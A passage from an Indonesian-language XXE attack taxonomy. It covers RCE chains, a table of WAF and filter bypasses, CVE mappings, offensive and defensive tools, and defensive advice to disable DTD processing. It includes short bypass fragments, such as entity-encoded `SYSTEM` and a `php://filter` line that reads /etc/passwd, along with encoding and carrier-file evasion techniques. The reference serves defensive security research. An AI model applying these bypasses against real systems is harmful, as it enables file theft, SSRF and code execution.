| **WebDAV NTLM leak** | Entitas mereferensikan URL WebDAV pada server penyerang | Windows mencoba autentikasi NTLM ke endpoint WebDAV |

### §7-5. Rantai XXE-to-RCE

XXE saja jarang mencapai remote code execution, tetapi berfungsi sebagai primitif yang kuat dalam rantai multi-langkah.

| Rantai | Komponen | Platform |
|-------|-----------|----------|
| **XXE → PHP expect://id** | §3-4 (wrapper `expect://`) | PHP dengan ekstensi `expect` |
| **XXE → Phar deserialization** | XXE membaca URI `phar://` yang memicu unserialization → gadget chain → RCE | PHP |
| **XXE → PHP filter chain (CVE-2024-2961)** | XXE + bug rantai filter iconv → penulisan file arbitrer → RCE | PHP (di-patch di PHP 8.x) |
| **XXE → pencurian kredensial → akses admin → RCE** | Baca file konfigurasi yang berisi kredensial → autentikasi sebagai admin → upload webshell | Platform apa pun |
| **XXE → SSRF → eksploitasi layanan internal** | XXE memicu SSRF ke layanan internal yang rentan | Platform apa pun dengan layanan internal yang rentan |
| **Nested deserialization → XXE (CVE-2024-34102)** | Deserialisasi objek yang dibuat memicu parsing XML dengan XXE | Magento/Adobe Commerce (PHP) |

---

## §8. Kompilasi Bypass WAF & Filter

Bagian ini mengkonsolidasikan teknik bypass dari seluruh taksonomi, diorganisir berdasarkan mekanisme penyaringan yang dihindari.

### §8-1. Bypass Filter Berbasis Kata Kunci

| Kata Kunci Target | Teknik Bypass | Referensi |
|---------------|-----------------|-----------|
| `SYSTEM` | HTML entity encoding: `S&#x59;STEM` | §5-3 |
| `ENTITY` | Referensi karakter: `&#69;NTITY` | §5-3 |
| `DOCTYPE` | Sisipkan whitespace: `<!DOCTYPE  foo` atau komentar XML | §5-2, §5-5 |
| `file://` | Gunakan `netdoc://` (Java) atau `php://filter` (PHP) | §3-4, §3-5 |
| `/etc/passwd` | Gunakan `php://filter/convert.base64-encode/resource=/etc/passwd` | §3-4 |

### §8-2. Bypass Content-Type & Format

| Filter | Teknik Bypass | Referensi |
|--------|-----------------|-----------|
| Konten XML diblokir | Kirim payload dalam container SVG, DOCX, atau XLSX | §4-1 |
| `application/xml` diblokir | Gunakan `text/xml` atau `application/soap+xml` | §4-2 |
| Endpoint hanya JSON | Alihkan Content-Type ke `application/xml`; framework mungkin melakukan auto-route | §4-3 |

### §8-3. Bypass Berbasis Encoding

| Filter | Teknik Bypass | Referensi |
|--------|-----------------|-----------|
| WAF hanya memeriksa UTF-8 | Encode payload dalam UTF-16 atau UTF-32 | §5-1 |
| WAF memeriksa rentang ASCII | Gunakan encoding UTF-7 atau EBCDIC | §5-1 |
| WAF regex pada baris pertama | Pisahkan deklarasi di beberapa baris, tambahkan komentar | §5-5 |

### §8-4. Bypass Struktural

| Filter | Teknik Bypass | Referensi |
|--------|-----------------|-----------|
| DTD diblokir | Gunakan XInclude alih-alih deklarasi entitas | §4-4 |
| External entity diblokir | Gunakan pemanfaatan ulang DTD lokal dengan eksfiltrasi berbasis error | §2-3 |
| HTTP keluar diblokir | Gunakan eksfiltrasi DNS atau error-based dengan DTD lokal | §3-6, §2-3 |
| Ekspansi entitas dibatasi | Gunakan quadratic blowup alih-alih ekspansi bersarang | §7-1 |
| External entity diblokir (PHP) | Rangkaikan ekspansi parameter entity dengan `php://filter` stream wrapper; dalam konfigurasi di mana `libxml_disable_entity_loader` membatasi resolusi external entity tetapi penanganan PHP stream wrapper tetap aktif, parameter entity yang mereferensikan rantai `php://filter` masih dapat memicu pembacaan file lokal melalui lapisan stream | §1-2, §3-4 |

---

## Pemetaan Attack Scenario (Sumbu 3)

| Skenario | Arsitektur | Kategori Mutasi Utama |
|----------|-------------|---------------------------|
| **Local File Read** | Aplikasi apa pun yang mengurai XML | §1-1 + §2-1 + §3-1 |
| **Eksfiltrasi Data Blind** | XML diurai tetapi tidak direfleksikan | §1-2 + §2-2 + §3-2/§3-3 |
| **Eksfiltrasi Berbasis Error (Tanpa Koneksi Keluar)** | Lingkungan dengan firewall, pesan error terlihat | §1-2 + §2-3 + §5-3 |
| **Pencurian Cloud Metadata** | Aplikasi yang di-host di cloud (AWS/GCP/Azure) | §1-1 + §3-2 + §7-2 |
| **Pencurian Kredensial NTLM** | Server yang tergabung dalam domain Windows | §1-1 + §3-1 (UNC) + §7-4 |
| **File Upload XXE** | Aplikasi yang menerima upload DOCX/XLSX/SVG/PDF | §4-1 + §1-1 |
| **API XXE** | Endpoint REST/SOAP yang menerima XML | §4-2 + §4-3 |
| **XXE yang Mengelak WAF** | Aplikasi yang dilindungi WAF | §5-1 + §5-3 + §8 |
| **XXE via Request Smuggling** | Aplikasi dengan WAF dan kerentanan HTTP desync | §4-2 + §8 — request body yang diselundupkan mengirimkan payload XXE melewati inspeksi XML WAF ke parser backend |
| **XXE ke RCE** | Aplikasi PHP atau Java dengan rantai yang dapat dieksploitasi | §3-4/§3-5 + §7-5 |
| **Denial of Service** | Aplikasi apa pun yang mengurai XML | §7-1 |

---

## Pemetaan CVE / Bounty (2024–2025)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|---------------------|-----------|----------------|
| §7-5 (nested deserialization → XXE) + §1-2 + §7-2 | CVE-2024-34102 — Adobe Commerce/Magento "CosmicSting" | CVSS 9.8. XXE tanpa autentikasi via nested deserialization; pemalsuan admin JWT, dapat dirangkai dengan CVE-2024-2961 untuk RCE. Dieksploitasi secara aktif di lapangan. |
| §6-3 (bypass parser .NET) + §1-2 + §4-3 | CVE-2024-30043 — Microsoft SharePoint | CVSS 7.1. Kebingungan parsing URL mem-bypass larangan DTD; pembacaan file dengan Farm Service Account, NTLM relay, SSRF. Memengaruhi on-prem dan cloud. |
| §1-1 + §3-2 + §7-2 | CVE-2025-58360 — GeoServer | CVSS High. XXE via operasi GetMap WMS; pembacaan file, SSRF, DoS. Ditambahkan ke katalog CISA KEV; dieksploitasi secara aktif. |
| §4-1 (carrier PDF/XFA) + §1-1 | CVE-2025-66516 — Apache Tika | CVSS 10.0. XXE via konten XFA yang dibuat khusus yang disematkan dalam file PDF; memengaruhi tika-core, tika-pdf-module, tika-parsers. |
| §1-1 + §6-1 (Java) | CVE-2024-45072 — IBM WebSphere Application Server | XXE pengguna berprivilese; pengungkapan informasi sensitif, konsumsi memori. |
| §1-1 + §3-2 + §6-1 | CVE-2024-22354 — IBM WebSphere Application Server Liberty | XXE dengan kemampuan SSRF; penyerang jarak jauh dapat mengekspos informasi sensitif. |
| §4-1 (XLSX) + §1-1 | CVE-2025-49493 — Akamai CloudTest | XXE via konfigurasi tes XML yang diunggah; diperbaiki dengan menonaktifkan pemrosesan DTD sepenuhnya. |
| §4-2 (EPP XXE) | CoCCA Registry Software EPP XXE (2023) | Pengungkapan file lokal + manipulasi zona ccTLD via XXE dalam protokol registrasi domain |

---

## Detection Tool

### Tool Ofensif (Scanner & Exploiter)

| Tool | Cakupan Target | Teknik Inti |
|------|-------------|---------------|
| **Burp Suite Scanner** | Aplikasi web | Deteksi XXE otomatis dengan payload blind/OOB; Burp Collaborator untuk konfirmasi OOB |
| **XXEinjector** | Endpoint XXE apa pun | Pengambilan file otomatis via metode langsung dan OOB; mendukung saluran HTTP, FTP, dan gopher |
| **XXExploiter** | Endpoint XXE apa pun | Menghasilkan payload dan secara otomatis memulai server eksfiltrasi; mendukung beberapa saluran eksfiltrasi |
| **oxml_xxe** | Endpoint upload file | Menyematkan payload XXE ke dalam file DOCX, XLSX, PPTX, ODT, SVG |
| **docem** | Endpoint upload dokumen | Menyematkan payload XXE/XSS ke dalam format DOCX, ODT, PPTX |
| **dtd-finder** | Pemanfaatan ulang DTD lokal | Menemukan file DTD di filesystem target; menghasilkan payload pemanfaatan ulang |
| **xxeserv** | Eksfiltrasi OOB | Mini webserver dengan dukungan FTP khusus untuk eksfiltrasi data XXE |
| **B-XSSRF** | Deteksi blind XXE/SSRF | Toolkit untuk mendeteksi dan melacak interaksi blind XXE dan SSRF |

### Tool Defensif

| Tool | Cakupan Target | Teknik Inti |
|------|-------------|---------------|
| **defusedxml (Python)** | Aplikasi Python | Pengganti drop-in untuk parser XML stdlib dengan XXE dinonaktifkan |
| **Acunetix** | Aplikasi web | Pemindaian XXE dengan AcuSensor untuk akurasi deteksi white-box |
| **OWASP ZAP** | Aplikasi web | Deteksi ekspansi entitas eksponensial (Alert ID 40044) |
| **libxml2 secure defaults** | Aplikasi PHP/Python/Ruby yang menggunakan libxml2 | Konfigurasi `XML_PARSE_NOENT` off, `XML_PARSE_DTDLOAD` off |

---

## Ringkasan: Prinsip Inti

**Properti fundamental** yang membuat seluruh kelas serangan XXE memungkinkan adalah keputusan desain XML untuk mengizinkan dokumen mereferensikan sumber daya eksternal melalui deklarasi entitas dalam DTD. Ini adalah fitur tingkat spesifikasi, bukan bug parser — spesifikasi XML 1.0 secara eksplisit mendefinisikan external entity sebagai mekanisme inti. Kerentanan muncul ketika fitur spesifikasi ini bertemu dengan input yang tidak tepercaya: parser dengan setia mengimplementasikan spesifikasi, dan aplikasi gagal membatasi kemampuan parser sebelum memproses XML yang dikendalikan pengguna.

**Patch inkremental gagal** karena attack surface tersebar di beberapa dimensi secara bersamaan. Memblokir `file://` masih meninggalkan SSRF `http://`. Memblokir external entity masih meninggalkan parameter entity dalam DTD eksternal. Menonaktifkan DTD eksternal masih meninggalkan pemanfaatan ulang DTD lokal. Memblokir deklarasi DOCTYPE masih meninggalkan XInclude. Memfilter kata kunci dikalahkan oleh mutasi encoding. Setiap pertahanan mengatasi satu sumbu mutasi sambil membiarkan yang lain terbuka. Inilah mengapa kerentanan ini bertahan selama beberapa dekade setelah penemuan awalnya — ledakan kombinatorial dari tipe entitas, sumber DTD, protocol handler, format carrier, dan lapisan encoding menciptakan ruang mutasi yang tidak dapat sepenuhnya ditangani oleh perbaikan titik.

**Solusi struktural** adalah satu prinsip universal: **nonaktifkan pemrosesan DTD sepenuhnya** di level parser sebelum memproses XML yang tidak tepercaya apa pun. Aplikasi modern harus menggunakan XSD (XML Schema Definition) untuk validasi alih-alih DTD, dan parser XML harus dikonfigurasi untuk menolak deklarasi DOCTYPE secara tegas. Ini menghilangkan penyebab utama — deklarasi entitas — alih-alih mencoba memfilter variasi tak terbatasnya. Setiap bahasa dan framework utama sekarang mendukung konfigurasi ini, dan versi parser yang lebih baru semakin default ke perilaku aman (PHP 8.0+, .NET 4.5.2+, lxml 3.x+). Risiko yang tersisa terkonsentrasi di aplikasi legacy, permukaan parsing XML yang tersembunyi (konverter dokumen, prosesor upload file, parser PDF), dan opsi parser yang salah konfigurasi yang mengaktifkan ulang pemrosesan entitas.

---

## Referensi

- OWASP XML External Entity Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy — XXE: https://portswigger.net/web-security/xxe
- PortSwigger Web Security Academy — Blind XXE: https://portswigger.net/web-security/xxe/blind
- HackTricks XXE Reference: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- PayloadsAllTheThings XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- GoSecure Advanced XXE Workshop: https://gosecure.github.io/xxe-workshop/
- Wallarm XXE WAF Bypass: https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/
- Assetnote — CVE-2024-34102 CosmicSting Analysis: https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102
- ZDI — CVE-2024-30043 SharePoint XXE: https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud
- Akamai — CVE-2025-66516 Apache Tika XXE: https://www.akamai.com/blog/security-research/cve-2025-66516-detecting-defending-apache-tika-xxe-attack
- HackerOne XXE Complete Guide: https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention
- Sonarsource — How to disable XXE processing: https://www.sonarsource.com/blog/secure-xml-processor/

---

*Dokumen ini dibuat untuk keperluan riset keamanan defensif dan pemahaman kerentanan.*